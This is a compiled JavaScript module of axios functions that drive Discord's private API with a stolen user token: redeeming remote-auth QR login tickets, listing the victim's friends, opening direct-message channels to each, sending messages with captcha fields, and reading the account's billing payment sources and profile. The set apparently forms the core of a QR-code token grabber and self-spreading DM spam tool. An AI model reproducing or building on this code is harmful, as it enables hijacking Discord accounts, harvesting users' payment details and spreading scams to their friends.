"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.getUserInformationAxios = exports.getBillingInforationAxios = exports.sendMessageWithCaptchaAxios = exports.sendMessageAxios = exports.createFriendChannelAxios = exports.getUserFriendsAxios = exports.getTicketWithCaptchaAxios = exports.getTicketAxios = void 0;
const axios_1 = __importDefault(require("axios"));
const USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0";
const getTicketAxios = async (ticket) => axios_1.default
    .post("https://discord.com/api/v9/users/@me/remote-auth/login", {
    ticket,
}, {
    headers: {
        "Content-Type": "application/json",
    },
})
    .then((res) => res.data)
    .catch((_) => _.response?.data);
exports.getTicketAxios = getTicketAxios;
const getTicketWithCaptchaAxios = async (ticket, captcha_key, captcha_rqtoken) => axios_1.default
    .post("https://discord.com/api/v9/users/@me/remote-auth/login", {
    ticket,
    captcha_key,
    captcha_rqtoken,
}, {
    headers: {
        "Content-Type": "application/json",
    },
})
    .then((res) => res.data)
    .catch((_) => _.response?.data);
exports.getTicketWithCaptchaAxios = getTicketWithCaptchaAxios;
const getUserFriendsAxios = async (token) => axios_1.default
    .get("https://discord.com/api/v9/users/@me/relationships", {
    headers: {
        Authorization: token,
        "User-Agent": USER_AGENT,
    },
})
    .then((res) => res.data)
    .catch((_) => _.response?.data);
exports.getUserFriendsAxios = getUserFriendsAxios;
const createFriendChannelAxios = async (token, friendId) => axios_1.default
    .post(`https://discord.com/api/v9/users/@me/channels`, {
    recipients: [friendId],
}, {
    headers: {
        "Content-type": "application/json; charset=UTF-8",
        "User-Agent": USER_AGENT,
        Authorization: token,
    },
})
    .then((res) => res.data)
    .catch((_) => _.response?.data);
exports.createFriendChannelAxios = createFriendChannelAxios;
const sendMessageAxios = async (token, channelId, message) => axios_1.default
    .post(`https://discord.com/api/v9/channels/${channelId}/messages`, {
    content: message,
}, {
    headers: {
        "Content-type": "application/json; charset=UTF-8",
        "User-Agent": USER_AGENT,
        Authorization: token,
    },
})
    .then((res) => res.data)
    .catch((_) => _.response?.data);
exports.sendMessageAxios = sendMessageAxios;
const sendMessageWithCaptchaAxios = async (token, channelId, message, captcha_key, captcha_rqtoken) => axios_1.default
    .post(`https://discord.com/api/v9/channels/${channelId}/messages`, {
    content: message,
    captcha_key,
    captcha_rqtoken,
}, {
    headers: {
        "Content-type": "application/json; charset=UTF-8",
        "User-Agent": USER_AGENT,
        Authorization: token,
    },
})
    .then((res) => res.data)
    .catch((_) => _.response?.data);
exports.sendMessageWithCaptchaAxios = sendMessageWithCaptchaAxios;
const getBillingInforationAxios = async (token) => axios_1.default
    .get(`https://discord.com/api/v9/users/@me/billing/payment-sources`, {
    headers: {
        "Content-type": "application/json; charset=UTF-8",
        "User-Agent": USER_AGENT,
        Authorization: token,
    },
})
    .then((res) => res.data)
    .catch((_) => { });
exports.getBillingInforationAxios = getBillingInforationAxios;
const getUserInformationAxios = async (token) => axios_1.default
    .get(`https://discord.com/api/v9/users/@me`, {
    headers: {
        "Content-type": "application/json; charset=UTF-8",
        "User-Agent": USER_AGENT,
        Authorization: token,
    },
})
    .then((res) => res.data)
    .catch((_) => _.response?.data);
exports.getUserInformationAxios = getUserInformationAxios;
